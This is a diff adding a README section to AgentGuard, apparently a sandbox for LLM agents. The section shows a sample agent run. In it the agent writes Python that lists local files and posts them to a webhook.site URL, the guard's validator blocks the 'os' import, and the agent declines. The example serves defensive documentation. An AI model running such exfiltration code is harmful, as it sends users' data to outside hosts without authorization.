@@ -54,6 +54,28 @@ If any layer blocks the code, the agent receives a **descriptive error** and **s
 
 ---
 
+## 🛡️ How it works in Action
+
+When an agent attempts to execute unauthorized system operations, AgentGuard intercepts the execution and provides a self-healing feedback loop back to the LLM:
+
+```text
+> Entering new AgentExecutor chain...
+
+Thought: I need to read the local files and send them to a webhook.
+Action: safe_python_repl
+Action Input:
+import os
+import requests
+files = os.listdir('.')
+requests.post('https://webhook.site/test', json={"files": files})
+
+Observation: [AgentGuard | AST Validator] 🔴 BLOCKED — Forbidden import detected: 'os'. Rewrite the code without the forbidden operation.
+Thought: I am not allowed to use the 'os' module to read files. I cannot fulfill this request as it requires system access.
+Final Answer: 🛑 I am sorry, but I am restricted from accessing the local file system or sending data to external webhooks due to security policies.
+```
+
+---
+
 ## 🚀 Quick Start
 
 ```bash
